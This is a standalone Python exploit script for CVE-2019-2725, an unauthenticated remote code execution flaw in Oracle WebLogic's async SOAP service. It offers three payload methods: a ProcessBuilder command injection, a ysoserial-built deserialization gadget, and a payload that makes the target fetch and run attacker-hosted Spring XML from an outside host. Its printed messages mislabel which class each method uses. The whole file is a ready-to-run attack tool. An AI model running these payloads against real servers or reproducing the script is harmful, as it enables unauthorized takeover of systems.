#!/usr/bin/python

# This code exploits the CVE-2019-2725 unauthenticated RCE vulnerability in WebLogic

# The vulnerability affects supported versions:
# 10.3.6.0, 12.1.3.0
#Tested on docker https://hub.docker.com/r/ismaleiva90/weblogic12/  (12.1.3.0)
#Tested on docker https://hub.docker.com/r/zhiqzhao/ubuntu_weblogic1036_domain/   (10.3.6.0)

# Information for building the exploit was taken from here: 
#https://paper.seebug.org/910/
#https://devcentral.f5.com/s/articles/oracle-weblogic-deserialization-remote-code-execution-34185
#https://www.f5.com/labs/articles/threat-intelligence/vulnerabilities--exploits--and-malware-driving-attack-campaigns-in-april-2019

# Dunstan Pinto, 18/5/2019 (dunstan.pinto@gmail.com)
import os
import sys
import requests
import time




def gen_payload1():
    payload="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\r\n    <soapenv:Header>\r\n        <wsa:Action>xx</wsa:Action>\r\n        <wsa:RelatesTo>xx</wsa:RelatesTo>\r\n        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\r\n            <void class=\"java.lang.ProcessBuilder\">\r\n                <array class=\"java.lang.String\" length=\"2\">\r\n                    <void index=\"0\">\r\n                        <string>touch</string>\r\n                    </void>\r\n                    <void index=\"1\">\r\n                        <string>/tmp/GIS</string>\r\n                    </void>\r\n                    </array>\r\n            <void method=\"start\"/></void>\r\n        </work:WorkContext>\r\n    </soapenv:Header>\r\n    <soapenv:Body>\r\n    <asy:onAsyncDelivery/>\r\n    </soapenv:Body>\r\n</soapenv:Envelope>"
    return payload

def gen_payload2(file):
    _payload = open(file, 'rb').read()
    _payload = bytearray(_payload)
    #print(_payload)
    payloads = ""
    payloads += '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void>'''
    payloads += f'\n<array class="byte" length="{len(_payload)}">'
    for i, v in enumerate(_payload):
        if v > 128:
            payloads += f'\n<void index="{i}"><byte>{v-256}</byte></void>'
        else:
            payloads += f'\n<void index="{i}"><byte>{v}</byte></void>'
    payloads += '''
</array>
</void></class>
</java>
</work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'''
    return payloads

def ysoserial(DNSURL):
    ysoserial_payload = f'java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS {DNSURL} > weblogic_payload'
    os.system(ysoserial_payload)

def rce(url,DNSURL):
    ysoserial(DNSURL)
    payloads = gen_payload2(os.path.join(os.getcwd(), 'weblogic_payload'))
    headers = {"Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Accept-Language": "en", "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)", "Connection": "close", "Content-Type": "text/xml"}
    res2 = requests.post(url, headers=headers, data=payloads)
    return res2

def gen_payload3(LHOST,LPORT):
    payload = ""
    payload += '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void><string>http://{0}:{1}/payload.xml</string></void></class>
</java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'''.format(LHOST,LPORT)
    return payload


if __name__ == '__main__':
    try:
        request_headers = {"Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Accept-Language": "en", "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)", "Connection": "close", "Content-Type": "text/xml"}

        url =  "http://{0}:{1}/_async/AsyncResponseService".format(sys.argv[1],sys.argv[2])

        method = sys.argv[3]

        if method == "1":
            try:
                print("Exploiting CVE-2019-2725 using class 'java.lang.ProcessBuilder'")
                print("Running the command 'touch /tmp/GIS'")
                payload=gen_payload1()
                response = requests.post(url, headers=request_headers, data=payload)

                if str(response.status_code)=="202":
                    print("Created a file at /tmp/GIS. Check the /tmp directory to confirm.")
                else:
                    print("Server not vulnerable to CVE-2019-2725")
            except:
                print("Usage: python3.6 cve-2019-2725.py <IP> <PORT> 1")

        
        elif method == "2":
            try:
                DNSURL = sys.argv[4]
                print("Exploiting CVE-2019-2725 using class 'com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext'")
                print("Performing DNS lookup for URL {0}".format(DNSURL))
                rce(url,DNSURL)
                print("Done!")

            except:
                print("Usage: python3.6 cve-2019-2725.py <IP> <PORT> 2 <DNSURL>")

        elif method == "3":
            try:
                LHOST = sys.argv[4]
                LPORT = sys.argv[5]
                print("Exploiting CVE-2019-2725 using class 'oracle.toplink.internal.sessions.UnitOfWorkChangeSet'")
                payload=gen_payload3(LHOST,LPORT)
                res = requests.post(url, headers=request_headers, data=payload)

                if str(res.status_code)=="202":
                    print("Created a file at /tmp/GIS. Check the /tmp directory to confirm.")
                else:
                    print("Server not vulnerable to CVE-2019-2725")
            except:
                print("Usage: python3.6 cve-2019-2725.py <IP> <PORT> 3 <LHOST> <LPORT>")
                print("Setup a webserver hosting the file payload.xml at LHOST on LPORT")
        else:
            print("Option 1: Using Class java.lang.ProcessBuilder")
            print("Usage: python3.6 cve-2019-2725.py <IP> <PORT> 1")
            print("\n")
            print("Option 2: Using Class com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext")
            print("Usage: python3.6 cve-2019-2725.py <IP> <PORT> 2 <DNSURL>")
            print("\n")
            print("Option 3: Using Class oracle.toplink.internal.sessions.UnitOfWorkChangeSet")
            print("Usage: python3.6 cve-2019-2725.py <IP> <PORT> 3 <LHOST> <LPORT>")
            print("Setup a webserver hosting the file payload.xml at LHOST on LPORT")

    except:
        print("Option 1: Using Class java.lang.ProcessBuilder")
        print("Usage: python3.6 cve-2019-2725.py <IP> <PORT> 1")
        print("\n")
        print("Option 2: Using Class com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext")
        print("Usage: python3.6 cve-2019-2725.py <IP> <PORT> 2 <DNSURL>")
        print("\n")
        print("Option 3: Using Class oracle.toplink.internal.sessions.UnitOfWorkChangeSet")
        print("Usage: python3.6 cve-2019-2725.py <IP> <PORT> 3 <LHOST> <LPORT>")
        print("Setup a webserver hosting the file payload.xml at LHOST on LPORT")


